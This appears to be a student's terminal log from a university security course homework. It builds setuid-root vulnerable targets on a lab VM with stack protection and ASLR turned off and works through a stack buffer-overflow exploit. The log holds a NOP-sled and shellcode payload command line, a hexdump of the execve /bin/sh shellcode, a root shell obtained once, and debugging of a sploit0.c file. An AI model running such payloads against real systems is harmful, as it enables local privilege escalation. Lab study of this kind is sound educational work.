   ̀1ۉ?@̀?????/bin/shp?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?p?
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./get_sp
Stack pointer (ESP): 0xbf9bb590
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x203';``cat sc``perl -e 'print"\x90\xb2\x9b\xbf"x38';`
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./get_sp
Stack pointer (ESP): 0xbfea7aa0
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x200';``cat sc``perl -e 'print"\xa0\x77\xea\xbf"x38';`
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
                                                                                                           ?
                                                                                                           ???V
   ̀1ۉ?@̀?????/bin/sh?w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w?
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ sudo sysctl -w kernel.randomize_va_space=0
[sudo] password for student: 
kernel.randomize_va_space = 0
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./get_sp
Stack pointer (ESP): 0xbffff5f0
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x200';``cat sc``perl -e 'print"\xa0\x77\xea\xbf"x38';`
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
                                                                                                           ?
                                                                                                           ???V
   ̀1ۉ?@̀?????/bin/sh?w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w꿠w?
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./get_sp
Stack pointer (ESP): 0xbffff5f0
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x203';``cat sc``perl -e 'print"\xf0\xf2\xff\xbf"x38';`
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
# whoami
root
# exit
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls /tmp
systemd-private-172553d828a945c3a2c572edfa692992-colord.service-Lavum4
systemd-private-172553d828a945c3a2c572edfa692992-rtkit-daemon.service-xKcBDG
systemd-private-172553d828a945c3a2c572edfa692992-systemd-timesyncd.service-nXlVG7
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls
get_sp  get_sp.c  meet  meet.c  sc  simpleargs.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls ..
demo  README.txt  sploits  targets
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls
get_sp  get_sp.c  meet  meet.c  sc  simpleargs.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ cd ..
student@5435-hw4-vm:~/cs5435-fa19-hw4$ ls
demo  README.txt  sploits  targets
student@5435-hw4-vm:~/cs5435-fa19-hw4$ cd targets/
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls -la
total 92
drwxr-xr-x 2 student student 4096 Nov 26 10:49 .
drwxr-xr-x 6 student student 4096 Nov 26 10:49 ..
-rw-r--r-- 1 student student  697 Nov 26 10:49 Makefile
-rwxr-xr-x 1 root    root    8580 Nov 26 10:49 target0
-rw-r--r-- 1 student student  259 Nov 26 10:49 target0.c
-rwxr-xr-x 1 root    root    9748 Nov 26 10:49 target1
-rw-r--r-- 1 student student  297 Nov 26 10:49 target1.c
-rwxr-xr-x 1 root    root    9964 Nov 26 10:49 target2
-rw-r--r-- 1 student student  734 Nov 26 10:49 target2.c
-rwxr-xr-x 1 root    root    9852 Nov 26 10:49 target3
-rw-r--r-- 1 student student  394 Nov 26 10:49 target3.c
-rwxr-xr-x 1 root    root    9744 Nov 26 10:49 target4
-rw-r--r-- 1 student student  292 Nov 26 10:49 target4.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cat Makefile 
CC := gcc
RM := rm -f
EXECSTACK := execstack

# flags
CFLAGSEXEC := -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector
CFLAGSNOEXEC := -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector

# sources
sources := target0.c target1.c target2.c target3.c  target4.c
targets := target0 target1 target2 target3 target4

# gmake magic
.PHONY: all clean

#targets
all: 
	$(CC) $(CFLAGSEXEC) -o target0 target0.c
	$(CC) $(CFLAGSEXEC) -o target1 target1.c
	$(CC) $(CFLAGSEXEC) -o target2 target2.c
	$(CC) $(CFLAGSEXEC) -o target3 target3.c
	$(CC) $(CFLAGSNOEXEC) -o target4 target4.c
	install -o root -t /tmp $(targets)
	chmod 4755 /tmp/target*

clean:
	$(RM) $(targets) $(sources:.c=.o)
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls
Makefile  target0.c  target1.c  target2.c  target3.c  target4.c
target0   target1    target2    target3    target4
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ sudo make
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target0 target0.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target1 target1.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target2 target2.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target3 target3.c
gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -o target4 target4.c
install -o root -t /tmp target0 target1 target2 target3 target4
chmod 4755 /tmp/target*
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls
Makefile  target0.c  target1.c  target2.c  target3.c  target4.c
target0   target1    target2    target3    target4
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls /tmp
systemd-private-172553d828a945c3a2c572edfa692992-colord.service-Lavum4             target0  target3
systemd-private-172553d828a945c3a2c572edfa692992-rtkit-daemon.service-xKcBDG       target1  target4
systemd-private-172553d828a945c3a2c572edfa692992-systemd-timesyncd.service-nXlVG7  target2
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ pwd
/home/student/cs5435-fa19-hw4/targets
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls -la
total 48
drwxr-xr-x 2 student student 4096 Nov 27 16:12 .
drwxr-xr-x 6 student student 4096 Nov 26 10:49 ..
-rwxr-xr-x 1 student student  475 Nov 26 10:49 shellcode.h
-rwxrwxr-x 1 student student 9948 Nov 27 16:12 sploit0
-rw-r--r-- 1 student student  375 Nov 26 10:49 sploit0.c
-rw-r--r-- 1 student student  375 Nov 26 10:49 sploit1.c
-rw-r--r-- 1 student student  375 Nov 26 10:49 sploit2.c
-rw-r--r-- 1 student student  375 Nov 26 10:49 sploit3.c
-rw-r--r-- 1 student student  375 Nov 26 10:49 sploit4.c
-rw-r--r-- 1 student student  375 Nov 26 10:49 sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi student
Bye student
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ hexdump ../demo/sc
0000000 c031 db31 17b0 80cd 1feb 895e 0876 c031
0000010 4688 8907 0c46 0bb0 f389 4e8d 8d08 0c56
0000020 80cd db31 d889 cd40 e880 ffdc ffff 622f
0000030 6e69 732f 0068                         
0000035
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./../demo/get_sp 
Stack pointer (ESP): 0xbffff5d0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./../demo/get_sp 
Stack pointer (ESP): 0xbffff5d0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ pwd
/home/student/cs5435-fa19-hw4/sploits
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls -la
total 48
drwxr-xr-x 2 student student 4096 Nov 27 16:12 .
drwxr-xr-x 6 student student 4096 Nov 26 10:49 ..
-rwxr-xr-x 1 student student  475 Nov 26 10:49 shellcode.h
-rwxrwxr-x 1 student student 9948 Nov 27 16:12 sploit0
-rw-r--r-- 1 student student  565 Nov 27 16:42 sploit0.c
-rw-r--r-- 1 student student  375 Nov 26 10:49 sploit1.c
-rw-r--r-- 1 student student  375 Nov 26 10:49 sploit2.c
-rw-r--r-- 1 student student  375 Nov 26 10:49 sploit3.c
-rw-r--r-- 1 student student  375 Nov 26 10:49 sploit4.c
-rw-r--r-- 1 student student  375 Nov 26 10:49 sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ cat sploit0.c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

void repeat (char input , int count )
{
  for (int i=0; i != count; i++ )
  {
    printf("%c", input);
  }
}

int main(void)
{
  char *args[3]; 
  char *env[1];

  repeat("\x90",5)
  
  args[0] = TARGET;
  args[1] = "student";
  /*"\x90"x203 + shellcodeAlephOne + "\xf8\xf2\xff\xbf"x38*/
  args[2] = NULL;
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
sploit0.c: In function ‘main’:
sploit0.c:23:10: warning: passing argument 1 of ‘repeat’ makes integer from pointer without a cast [-Wint-conversion]
   repeat("\x90",5)
          ^
sploit0.c:10:6: note: expected ‘char’ but argument is of type ‘char *’
 void repeat (char input , int count )
      ^
sploit0.c:25:3: error: expected ‘;’ before ‘args’
   args[0] = TARGET;
   ^
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
sploit0.c: In function ‘main’:
sploit0.c:23:10: warning: passing argument 1 of ‘repeat’ makes integer from pointer without a cast [-Wint-conversion]
   repeat("\x90",5);
          ^
sploit0.c:10:6: note: expected ‘char’ but argument is of type ‘char *’
 void repeat (char input , int count )
      ^
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi student
Bye student
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
sploit0.c: In function ‘main’:
sploit0.c:23:10: warning: passing argument 1 of ‘repeat’ makes integer from pointer without a cast [-Wint-conversion]
   repeat("e",5);
          ^
sploit0.c:10:6: note: expected ‘char’ but argument is of type ‘char *’
 void repeat (char input , int count )
      ^
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi student
Bye student
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ cat sploit0.c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

void repeat (char input , int count )
{
  for (int i=0; i != count; i++ )
  {
    printf("%c", input);
  }
}

int main(void)
{
  char *args[3]; 
  char *env[1];

  repeat('e',5);
  
  args[0] = TARGET;
  args[1] = "student";
  /*"\x90"x203 + shellcodeAlephOne + "\xf8\xf2\xff\xbf"x38*/
  args[2] = NULL;
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
result : hellhellhell
Hi student
Bye student
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
result : ???
Hi student
Bye student
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
result : ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
         ?
          ???V
              ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Hi student
Bye student
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./../demo/get_sp 
Stack pointer (ESP): 0xbffff5d0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./../demo/get_sp 
Stack pointer (ESP): 0xbffff5d0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./../demo/get_sp 
Stack pointer (ESP): 0xbffff5d0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
                                                                                                           ?
                                                                                                           ???V
   ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
sploit0.c: In function ‘main’:
sploit0.c:39:10: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘char *’ [-Wformat=]
   printf("result : %x\n", result);
          ^
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
result : ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
       ?
        ???V
            ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Hi ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
 ?
  ???V
      ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
result : ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
        ?
         ???V
             ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Hi ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
  ?
   ???V
       ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
result : ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
         ?
          ???V
              ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./../demo/get_sp 
Stack pointer (ESP): 0xbffff5d0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0^C
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ cd ../demo/
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x203';``cat sc``perl -e 'print"\xf0\xf2\xff\xbf"x38';`
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
# exit
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ cd ../sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
result : ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
         ?
          ???V
              ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
result : ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
         ?
          ???V
              ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ cd ../sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ../demo/get_sp 
Stack pointer (ESP): 0xbffff5d0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
                                                                                                           ?
                                                                                                           ???V
   ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
 ?
  ???V
      ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
  ?
   ???V
       ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdp -q sploit
No command 'gdp' found, but there are 16 similar ones
gdp: command not found
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit
sploit: No such file or directory.
(gdb) ls
Undefined command: "ls".  Try "help".
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit0
Reading symbols from sploit0...done.
(gdb) set follow-fork-mode child
(gdb) b 39
Breakpoint 1 at 0x80485f1: file sploit0.c, line 39.
(gdb) n
The program is not being run.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit0 

Breakpoint 1, main () at sploit0.c:39
39	  strcat(result, result2);
(gdb) x/x $ebp
0xbffff5a8:	0x00000000
(gdb) n
43	  args[0] = TARGET;
(gdb) n
44	  args[1] = result;
(gdb) x/x $ebp
0xbffff5a8:	0x00000000
(gdb) x/x $ebp
0xbffff5a8:	0x00000000
(gdb) n
46	  args[2] = NULL;
(gdb) n
48	  env[0] = NULL;
(gdb) x/x $ebp
0xbffff5a8:	0x00000000
(gdb) stepi
49	  execve(TARGET, args, env);
(gdb) x/x $ebp
0xbffff5a8:	0x00000000
(gdb) stepi
0x08048620	49	  execve(TARGET, args, env);
(gdb) x/x $ebp
0xbffff5a8:	0x00000000
(gdb) stepi
0x08048623	49	  execve(TARGET, args, env);
(gdb) x/x $ebp
0xbffff5a8:	0x00000000
(gdb) stepi
0x08048624	49	  execve(TARGET, args, env);
(gdb) stepi
0x08048627	49	  execve(TARGET, args, env);
(gdb) x/x $ebp
0xbffff5a8:	0x00000000
(gdb) stepi
0x08048628	49	  execve(TARGET, args, env);
(gdb) stepi
0x0804862d	49	  execve(TARGET, args, env);
(gdb) stepi
0x08048400 in execve@plt ()
(gdb) x/x $ebp
0xbffff5a8:	0x00000000
(gdb) stepi
0x08048406 in execve@plt ()
(gdb) stepi
0x0804840b in execve@plt ()
(gdb) stepi
0x080483a0 in ?? ()
(gdb) x/x $ebp
0xbffff5a8:	0x00000000
(gdb) stepi
0x080483a6 in ?? ()
(gdb) stepi
_dl_runtime_resolve () at ../sysdeps/i386/dl-trampoline.S:35
35	../sysdeps/i386/dl-trampoline.S: No such file or directory.
(gdb) stepi
37	in ../sysdeps/i386/dl-trampoline.S
(gdb) stepi
39	in ../sysdeps/i386/dl-trampoline.S
(gdb) stepi
41	in ../sysdeps/i386/dl-trampoline.S
(gdb) stepi
42	in ../sysdeps/i386/dl-trampoline.S
(gdb) stepi
43	in ../sysdeps/i386/dl-trampoline.S
(gdb) stepi
_dl_fixup (l=0xb7fff918, reloc_arg=40) at dl-runtime.c:66
66	dl-runtime.c: No such file or directory.
(gdb) stepi
0xb7fe97e1	66	in dl-runtime.c
(gdb) stepi
0xb7fe97e2	66	in dl-runtime.c
(gdb) stepi
0xb7fe97e4	66	in dl-runtime.c
(gdb) stepi
0xb7fe97e5	66	in dl-runtime.c
(gdb) x/x $ebp
0xbffff5a8:	0x00000000
(gdb) n
72	in dl-runtime.c
(gdb) n
69	in dl-runtime.c
(gdb) n
71	in dl-runtime.c
(gdb) n
69	in dl-runtime.c
(gdb) n
68	in dl-runtime.c
(gdb) n
69	in dl-runtime.c
(gdb) n
71	in dl-runtime.c
(gdb) n
73	in dl-runtime.c
(gdb) n
74	in dl-runtime.c
(gdb) n
73	in dl-runtime.c
(gdb) n
74	in dl-runtime.c
(gdb) n
79	in dl-runtime.c
(gdb) n
73	in dl-runtime.c
(gdb) n
79	in dl-runtime.c
(gdb) n
83	in dl-runtime.c
(gdb) n
87	in dl-runtime.c
(gdb) n
91	in dl-runtime.c
(gdb) n
92	in dl-runtime.c
(gdb) n
94	in dl-runtime.c
(gdb) n
101	in dl-runtime.c
(gdb) n
100	in dl-runtime.c
(gdb) n
101	in dl-runtime.c
(gdb) n
111	in dl-runtime.c
(gdb) n
115	in dl-runtime.c
(gdb) q
A debugging session is active.

	Inferior 1 [process 2341] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit0
Reading symbols from sploit0...done.
(gdb) set follow-fork-mode child
(gdb) b 48
Breakpoint 1 at 0x8048616: file sploit0.c, line 48.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit0 

Breakpoint 1, main () at sploit0.c:48
48	  env[0] = NULL;
(gdb)  x/x $ebp
0xbffff5a8:	0x00000000
(gdb) n
49	  execve(TARGET, args, env);
(gdb)  x/x $ebp
0xbffff5a8:	0x00000000
(gdb) n
process 2347 is executing new program: /tmp/target0
